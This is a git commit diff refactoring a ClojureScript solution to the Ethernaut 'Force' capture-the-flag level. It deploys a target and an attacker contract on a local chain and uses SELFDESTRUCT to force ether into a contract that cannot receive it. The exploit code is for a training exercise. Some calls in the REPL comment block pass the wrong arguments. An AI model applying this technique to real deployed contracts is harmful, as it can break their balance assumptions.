1e2f01e4a4d0c9a493d89f19c2499b7b34a89292
Avichal <pandeyavichal7@gmail.com>
2022-03-22 12:40:24 +0530

    Refactor force contract using js/Promise interop

--- src/main/ctf/ethernaut/force.cljs
+++ src/main/ctf/ethernaut/force.cljs
@@ -1,56 +1,94 @@
 (ns ctf.ethernaut.force
+  "The Force contract doesn't have a `fallback` or `receive`
+  functions. But we can still send ehter to it!
+
+  The trick is create another contract with a
+  positive balance. Then use `SELFDESTRUCT` on the
+  contract you created.
+  Selfdestruct lets you specify an address.
+  When EVM executes SELFDESTRUCT instruction it sends any
+  ehter that the contract has to the specifed address"
   (:require [ctf.ethernaut.utils :as u]
-            [ctf.ethernaut.wallets :as w]))
+            [ctf.ethernaut.wallets :as w]
+            [cljs.core.async :as a]
+            [cljs.core.async.interop :refer-macros [<p!]]))
 
 
-(def force (atom ""))
-(def attacker (atom ""))
 
 ;; Init the a new wallet for the player
-(def user-wallet (.createRandom (.-Wallet u/ethers)))
+;; Attach it with the local provider
+(def player
+  (.connect
+   (.createRandom (.-Wallet u/ethers))
+   w/local-provider))
+
+
+(defn deploy-force!
+  "Deploys the target contract that player needs to attack!
+   Returns the `js/Promise`."
+  []
+  (let [contract (u/contract :force
+                             w/local-wallet)]
+    (.deploy contract)))
+
+
+(defn deploy-attacker!
+  "Deploys the attacker contract that player uses to attack!
+   Takes the addr of the target. Returns the `js/Promise`."
+  [addr]
+  (let [contract (u/contract :force/attacker player)]
+    (.deploy contract addr)))
+
+
+(defn initial-funding!
+  "Sends initial funds the newly created wallet from Owner's wallet"
+  []
+  (let [tx (clj->js
+                 {:value (u/eth-str->wei "100.0")
+                  :to    (.-address player)})]
+    (.sendTransaction w/local-wallet tx)))
+
+
+(defn trigger!
+  "Player triggers the attack by sending the tx to the Attacker contract
+  This will make the Attacker contract call SELFDESTRUCT
+  and send its balance to Force contract"
+  [attacker]
+  (let [tx (clj->js {:value (u/eth-str->wei "1")
+                     :to (.-address attacker)})]
+    (.sendTransaction player tx)))
+
+
+(defn self-destruct-attack
+  "Async Go block to trigger the attack"
+  []
+  (a/go
+    (try
+      (let [tx (<p! (initial-funding!))
+            force    (<p! (deploy-force!))
+            attacker (<p! (deploy-attacker! (.-address force)))
+            trigger  (<p! (trigger! attacker))]
+        (<p!
+         (.getBalance
+          w/local-provider
+          (.-address force))))
+      (catch js/Error err
+        (js/console.log (ex-cause err))))))
 
 
 (comment
 
-  ;; Fund the newly created wallet from Owner's wallet
-  (.sendTransaction w/local-wallet
-                    (clj->js
-                     {:value (.parseEther (.-utils u/ethers) "100.0") ;; add in utils
-                      :to    (.-address user-wallet)}))
 
+  (initial-funding!)
 
-  ;; The Force contract doesn't have a `fallback` or `receive`
-  ;; functions. But we can still send ehter to it!
+  (deploy-force!)
 
-  ;; The trick is create another contract with a
-  ;; positive balance. Then use `SELFDESTRUCT` on the
-  ;; contract you created.
-  ;; Selfdestruct lets you specify an address.
-  ;; When EVM executes SELFDESTRUCT instruction it sends any
-  ;; ehter that the contract has to the specifed address
+  (deploy-attacker! (.-address player))
 
+  (trigger! player)
 
-  ;; Deploy the contract locally (using the default wallet)
-
-
-  ;; Deploy the contract locally (using the default wallet)
-  (-> (.deploy (u/contract :force w/local-wallet))
-      (.then #(reset! force %))
-      (.catch #(.log js/console %)))
-
-  ;; Make the player deploy the Attacker contract
-  (-> (.deploy (u/contract :force/attacker
-                           (.connect user-wallet w/local-provider))
-               (.-address @force))
-      (.then #(reset! attacker %))
-      (.catch #(.log js/console %)))
-
-  (.sendTransaction
-   (.connect user-wallet w/local-provider)
-   (clj->js {:to (.-address @attacker-contract)
-             :value (.parseEther (.-utils u/ethers)
-                                 "1")}))  
-  
+  ;; Execute this block to the the attack
+  (a/take! (self-destruct-attack)
+           #(.log js/console %))
 
   )
-
